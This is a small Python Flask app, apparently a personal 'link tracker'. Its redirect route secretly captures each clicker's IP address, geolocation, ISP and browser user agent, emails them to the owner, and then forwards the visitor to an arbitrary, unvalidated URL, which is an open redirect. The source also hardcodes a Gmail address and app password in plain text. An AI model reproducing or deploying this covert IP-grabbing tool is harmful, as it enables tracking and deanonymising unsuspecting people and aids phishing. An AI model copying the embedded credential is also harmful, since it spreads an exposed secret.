import os
import smtplib
from email.mime.text import MIMEText
from flask import Flask, redirect, request
import requests

app = Flask(__name__)


def send_email(details):
  try:
    sender_email = "jawadansari203@gmail.com"
    receiver_email ="jawadansari203@gmail.com"
    password ="anyx pdwm dtqe difg"

    if not sender_email or not password:
      print("Email credentials missing")
      return

    msg_content = f"""
New Link Clicked!

IP Address: {details.get('ip')}
Location: {details.get('city')}, {details.get('region')}, {details.get('country')}
ISP: {details.get('org')}
User-Agent: {details.get('user_agent')}
Target URL: {details.get('target_url')}
"""

  
    msg = MIMEText(msg_content)
    msg["Subject"] = "🚨 New Link Tracker Alert!"
    msg["From"] = sender_email
    msg["To"] = receiver_email

    # Using port 587 with TLS (better compatibility on cloud servers)
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
      server.starttls()
      server.login(sender_email, password)
      server.sendmail(sender_email, receiver_email, msg.as_string())
  except Exception as e:
    print("Email sending failed, but redirecting anyway:", e)


@app.route("/")
def home():
  return "Link Tracker is Live and Running!"


@app.route("/go")
def track_and_redirect():
  target_url = request.args.get("url", "https://www.google.com")

  if request.headers.get("X-Forwarded-For"):
    ip = request.headers.get("X-Forwarded-For").split(",")[0].strip()
  else:
    ip = request.remote_addr

  user_agent = request.headers.get("User-Agent")

  geo_data = {}
  try:
    if ip and ip != "127.0.0.1":
      res = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
      geo_data = res.json()
  except Exception:
    pass

  details = {
      "ip": ip,
      "city": geo_data.get("city", "Unknown"),
      "region": geo_data.get("region", "Unknown"),
      "country": geo_data.get("country_name", "Unknown"),
      "org": geo_data.get("org", "Unknown"),
      "user_agent": user_agent,
      "target_url": target_url,
  }

  # Call email function safely so it never crashes the redirect
  send_email(details)

  return redirect(target_url)


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=10000)
